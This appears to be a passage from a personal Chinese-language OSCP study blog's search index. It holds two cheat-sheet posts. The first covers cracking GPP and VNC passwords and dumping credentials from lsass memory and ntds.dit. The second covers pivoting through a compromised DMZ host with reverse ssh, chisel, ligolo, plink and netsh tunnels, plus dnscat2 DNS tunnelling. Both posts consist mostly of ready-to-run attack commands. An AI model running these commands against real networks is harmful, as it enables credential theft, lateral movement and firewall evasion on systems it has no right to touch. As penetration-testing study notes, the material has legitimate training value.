cert.pem\n\n直接申请TGT：\ngettgtpkinit.py\n\nhttps://wadcoms.github.io/wadcoms/PKINIT-gettgtpkinit/\n\n得提前配置kinit\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"gpp密码解密\"\u003eGPP密码解密\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e自动：\nhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1\n\n\n手动：\ngpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"vnc解密\"\u003eVNC解密\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eecho -n 加密密码，去掉： | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"提取宏文件\"\u003e提取宏文件\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e提取文件：\nunzip Currency\\ Volume\\ Report.xlsm\n宏文件通常为.bin结尾的哪个，使用strings读取即可\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"dump内存读取\"\u003edump内存读取\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003epip3 install pypykatz  \npypykatz lsa minidump lsass.DMP\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"ntdsdit密码获取\"\u003entds.dit密码获取\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e这个文件无法直接获取，正常情况下需要管理员权限，但是特殊情况下可以获取，比如BACKUP OPERATORS组用户：\n参考：\nhttps://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801\n\n这个文件需要配合system.hive文件进行破解，获取方法：\nreg save HKLM\\SYSTEM C:\\system.hive\n\n\n破解：\npython3 secretsdump.py -ntds ~/Desktop/ntds.dit -system ~/Desktop/system.hiv LOCAL\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"16进制转换成字符串\"\u003e16进制转换成字符串：\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eecho -n \u0026#39;6d2424716c5f53405f504073735730726421\u0026#39; | xxd -r -p\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"msg格式文件读取\"\u003emsg格式文件读取\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e转换格式为eml:\nmsgconvert *.msg\n读取：\nxdg-open xx.eml\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"hashcat\"\u003ehashcat\u003c/h1\u003e\n\u003cp\u003e规则编写：\u003c/p\u003e","title":"隐藏信息获取\u0026破解"},{"content":"Linux SSH -g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 -N：仅实现端口转发功能，不登录ssh。 -L：表示local，本地端口转发； 知道目标主机的ssh账密的情况： 本地端口转发，以下命令的意思为，将主机10.10.10.1的4321端口，映射为127.0.0.1的1234端口，也就是说，访问本地的1234端口，相当于访问10.10.10.1的4321端口 ssh -g -N -L [1234]:[127.0.0.1]:[4321] [cxk]@[10.10.10.1] -p [22] 远距离端口转发，（不包括攻击机）适合三台，第二台有ssh密码的情况 ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 远程端口转发，以下命令的意思为，将主机10.10.10.1的4321端口映射为192.168.2.1的1234端口，适用于中间主机的情况，回连kali ssh -g -N -R [1234]:[192.168.2.1]:[4321] [cxk]@[10.10.10.1] -p [22] 中间主机+远程端口+本地kali 远距离端口转发 ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4 SOCKS代理，socks5 无账号密码，连接本地127.0.0.1即可 ssh -g -N -D [127.0.0.1][1234] [ssh帐号]@[ssh服务IP] -p [ssh服务端口] ssh -N -D 0.0.0.0:9999 database_admin@10.4.187.215 本机kali开放ssh，需要ssh版本7.6以上： sudo systemctl restart ssh.service ssh -N -R 9998 kali@192.168.5.66 socks隧道，kali的9998即代表远程主机的 SSH 本地端口转发： DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口\n命令：\nssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 SSH动态端口转发 ssh -qTfnN -D 7080 kali@VPS地址\nDMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，通过一的9999可以访问到第二台主机的任何路由\n命令：\nssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215 SSH 远程端口转发 主要是防火墙规避，主机和攻击机通过ssh外联建立隧道，可以访问到DMZ第二台主机的映射端口\n需要kali开启ssh\n命令：\nssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4 SSH远程动态端口转发 上面一种场景的增强版，socks隧道：\n需要kali开启ssh\n命令：\nssh -N -R 9998 kali@192.168.118.4 sshuttle 工具 适用于有目标ssh密码的情况，可以在主机上直接添加路由\nhttps://github.com/sshuttle/sshuttle sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24 SOCAT 常用 socat TCP-LISTEN:8009,fork,reuseaddr tcp:10.4.187.215:22 \u0026amp; socat -ddd TCP-LISTEN:1194,fork TCP:51.79.169.191:1194 socat -ddd UDP-LISTEN:1194,fork TCP:51.79.169.191:1194 chisel 工具 扫描速度很慢，如果是访问端口可以接受 http+ssh嵌套\nhttps://github.com/jpillora/chisel 场景一，代理被攻击机的本地127.0.0.1:3306 kali当作服务端： ./chisel server -p 6666 --reverse 被攻击机： ./chisel client -v kali_ip:6666 R:0.0.0.0:8888:127.0.0.1:3306 socsk5 ./chisel client -v 192.168.45.198:6666 R:5000:socks ligolo 工具 当前情况下的最好选择 https://github.com/sysdream/ligolo https://github.com/nicocha30/ligolo-ng kali配置网卡： sudo ip tuntap add user kali mode tun ligolo \u0026amp;\u0026amp; sudo ip link set ligolo up 服务端： ./proxy -selfcert 客户端： agent.exe -connect 192.168.45.234:11601 -ignore-cert 服务端收到信息后配置： session tunnel_start 添加路由： sudo ip route add 172.16.30.0/24 dev ligolo 常见命令： ip rout WINDOWS ssh 确认ssh： where ssh 确认版本， 高于7.6才可以远程动态端口转发 ssh.exe -V 命令是一样的： ssh -N -R 9998 kali@192.168.118.4 plink 应用场景类似于远程端口转发\n命令： C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw \u0026lt;YOUR PASSWORD HERE\u0026gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4 如果处于非交互式shell: cmd.exe /c echo y | .\\plink.exe -ssh -l kali -pw \u0026lt;YOUR PASSWORD HERE\u0026gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7 Netsh 类似于本地端口转发\n命令： netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215 防火墙允许相关： netsh advfirewall firewall add rule name=\u0026#34;port_forward_ssh_2222\u0026#34; protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow DNS隧道 在DNS服务器上运行： dnscat2-server feline.corp 在受害者服务器上运行： ./dnscat feline.corp 在服务上开启端口转发： 使用会话 window -i 1 端口转发 listen 0.0.0.0:4646 172.16.223.217:4646 ew https://github.com/idlefire/ew ./ew -s ssocksd -l 8888 端口转发： ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999 ","permalink":"https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/","summary":"\u003ch1 id=\"linux\"\u003eLinux\u003c/h1\u003e\n\u003ch2 id=\"ssh\"\u003eSSH\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e-g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 \n-N：仅实现端口转发功能，不登录ssh。 \n-L：表示local，本地端口转发； \n\n知道目标主机的ssh账密的情况：\n\n本地端口转发，以下命令的意思为，将主机10.10.10.1的4321端口，映射为127.0.0.1的1234端口，也就是说，访问本地的1234端口，相当于访问10.10.10.1的4321端口 \n\nssh -g -N -L [1234]:[127.0.0.1]:[4321] [cxk]@[10.10.10.1] -p [22] \n\n远距离端口转发，（不包括攻击机）适合三台，第二台有ssh密码的情况\nssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215\n\n远程端口转发，以下命令的意思为，将主机10.10.10.1的4321端口映射为192.168.2.1的1234端口，适用于中间主机的情况，回连kali\n\nssh -g -N -R [1234]:[192.168.2.1]:[4321] [cxk]@[10.10.10.1] -p [22] \n\n中间主机+远程端口+本地kali 远距离端口转发\nssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4\n\n\nSOCKS代理，socks5 无账号密码，连接本地127.0.0.1即可 \n\nssh -g -N -D [127.0.0.1][1234] [ssh帐号]@[ssh服务IP] -p [ssh服务端口]\n\nssh -N -D 0.0.0.0:9999 database_admin@10.4.187.215\n\n\n\n\n本机kali开放ssh，需要ssh版本7.6以上：\nsudo systemctl restart ssh.service\nssh -N -R 9998 kali@192.168.5.66\nsocks隧道，kali的9998即代表远程主机的\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"ssh-本地端口转发\"\u003eSSH 本地端口转发：\u003c/h2\u003e\n\u003cp\u003eDMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口\u003c/p\u003e\n\u003cp\u003e命令：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003essh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/oscp_img/Pasted%20image%2020240314213959.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"隧道代理"}]